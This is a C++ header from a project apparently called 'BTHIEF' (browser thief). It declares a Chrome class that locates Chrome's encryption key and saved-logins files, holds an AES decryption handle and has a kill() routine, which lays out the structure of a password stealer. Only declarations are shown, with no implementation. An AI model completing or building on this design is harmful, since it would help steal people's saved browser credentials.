#ifndef BTHIEF_BROWSERS_CHROME_CHROME_HXX
#define BTHIEF_BROWSERS_CHROME_CHROME_HXX

#include "browsers/browser.hxx"
#include <expected>
#include <filesystem>
#include <windows.h>
#include <bcrypt.h>
#include <wil/resource.h>

class chrome : public browser {
public:
    chrome();
    std::expected<std::vector<login>, browser_error> get_logins(void) override;

private:
    std::filesystem::path m_key_path, m_logins_path;
    wil::unique_bcrypt_algorithm m_aes_alg;

    std::filesystem::path get_base_path(void);
    void kill(void);
};

#endif // ifndef BTHIEF_BROWSERS_CHROME_CHROME_HXX
